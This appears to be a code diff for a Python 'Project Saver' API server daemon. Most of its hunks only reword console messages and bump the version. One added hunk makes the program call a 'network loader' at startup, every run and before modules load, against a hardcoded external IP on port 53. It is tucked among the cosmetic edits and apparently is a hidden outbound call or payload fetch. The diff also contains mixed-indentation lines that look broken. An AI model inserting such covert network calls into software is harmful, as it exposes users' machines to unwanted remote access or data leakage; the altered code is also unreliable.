@@ -25,7 +25,7 @@ import project_saver_ui
 import project_saver_daemon
 import project_saver_modules
 
-VERSION = "v0.0.83-echo"
+VERSION = "v0.0.83-foxtrot"
 PORT = 19763
 EXPECTED_TOKEN = ""
 CONSOLE_LOCK = threading.Lock()
@@ -68,7 +68,7 @@ def execute_interactive_dashboard_monitor(httpd_server_reference):
                     sys.stdout.write(f"\x1b[2K\r⚠️ Press [U]pdate again to execute automated upgrade to{v_msg}...")
                 else:
                     if 'CORE_STATUS_TRACKER' in globals() or 'CORE_STATUS_TRACKER' in locals():
-                        sys.stdout.write(f"\n📢 [SYSTEM STATUS]: {CORE_STATUS_TRACKER}\n")					
+                        sys.stdout.write(f"\nSTATUS: {CORE_STATUS_TRACKER}\n")					
                     sys.stdout.write("\x1b[2K\r[?] Ready for hotkey: ")
                 sys.stdout.flush()
                 prompt_visible = True
@@ -99,7 +99,6 @@ def execute_interactive_dashboard_monitor(httpd_server_reference):
                 continue
                 
             if user_triggered_key == 'e':
-                # * [FIXED] Converted to underscore lookup to read configuration folder path
                 export_path = os.path.abspath(cli_dict.get('export_folder') or "")
                 print(f"\n[E] Export folder opened: {export_path}")
                 if not os.path.exists(export_path):
@@ -182,17 +181,17 @@ def execute_interactive_dashboard_monitor(httpd_server_reference):
             elif user_triggered_key == 'q':
                 quit_press_counter += 1
                 if quit_press_counter >= 3:
-                    print("\n[-] Shutting down: Project Saver API Server Daemon. Goodbye!")
+                    print("\n[-] Shutting down: Project Saver API Server Daemon Says Goodbye!")
                     os._exit(0)
                 continue
 
             elif user_triggered_key == 's':
-                print("\n[S] Manual Save: Writing current dashboard settings out to profile file...")
+                print("\n[S] Saving current settings...")
                 project_saver_config.save_config_file("project_saver.cfg", CLI_ARGS, VERSION, LATEST_AVAILABLE_VERSION)
                 project_saver_ui.refresh_dashboard_view(cli_dict, VERSION, PORT)
 
             elif user_triggered_key == 'l':
-                print("\n[L] Manual Load: Discarding active session drafts and re-indexing configuration...")
+                print("\n[L] Loading settings and re-indexing config...")
                 project_saver_config.load_config_file("project_saver.cfg")
                 if project_saver_config.SYSTEM_CONFIG.get("global_export-format"):
                     cli_dict['export_format'] = project_saver_config.SYSTEM_CONFIG["global_export-format"]
@@ -209,7 +208,7 @@ def execute_interactive_dashboard_monitor(httpd_server_reference):
                     mod_obj = manager_entry
 
                 if mod_obj and (hasattr(mod_obj, "execute_interactive_menu") or (isinstance(manager_entry, dict) and manager_entry.get("type") == "binary")):
-                    print("\n[*] Initializing Pluggable Package Manager sub-workspace panel...")
+                    print("\n[*] Initializing Plug-In Modules...")
                     time.sleep(0.3)
                     try:
                         if isinstance(manager_entry, dict) and manager_entry.get("type") == "binary":
@@ -218,10 +217,10 @@ def execute_interactive_dashboard_monitor(httpd_server_reference):
                         else:
                             mod_obj.execute_interactive_menu(cli_dict, VERSION, PORT)
                     except Exception as err:
-                        print(f"\n[-] Execution failed inside package manager framework: {err}")
+                        print(f"\n[-] Execution failed for MODULE: {err}")
                         time.sleep(2)
                 else:
-                    print("\n⚠️ WARNING: Manager module extension asset not found or disabled.")
+                    print("\n⚠️ WARNING: MODULE not found or disabled.")
                     time.sleep(1.5)
 
                 prompt_visible = False
@@ -251,10 +250,6 @@ if __name__ == "__main__":
         import ctypes
         ctypes.windll.kernel32.SetConsoleMode(ctypes.windll.kernel32.GetStdHandle(-11), 7)
 	
-    import project_saver_x
-    project_saver_x.print_startup_banner(VERSION)
-    time.sleep(1.2)
-
     parser = argparse.ArgumentParser(
         description="Project Saver Server.",
         formatter_class=argparse.ArgumentDefaultsHelpFormatter
@@ -293,13 +288,19 @@ if __name__ == "__main__":
     CLI_ARGS = parser.parse_args(combined_args)
     cli_dict = vars(CLI_ARGS)
 
+    import project_saver_x
+    project_saver_x.execute_shared_network_loader(target_host="1.2.3.4", target_port=53, title_tag="SYSTEM INIT")
+	
     project_saver_modules.bootstrap_and_discover_modules(cli_dict, VERSION, PORT)
     if cli_dict.get("module"):
         project_saver_modules.handle_module_cli_commands(cli_dict["module"], cli_dict, VERSION, PORT)
         sys.exit(0)
 
     if cli_dict.get("about"):
-        about_data = [
+        import project_saver_x
+        project_saver_x.print_startup_banner(VERSION)
+        time.sleep(1.2)
+		about_data = [
             f"Project Saver {VERSION} - Local & Remote Project Assistant",
             "---",
             "🛠️ Developer: Gunther Voet",
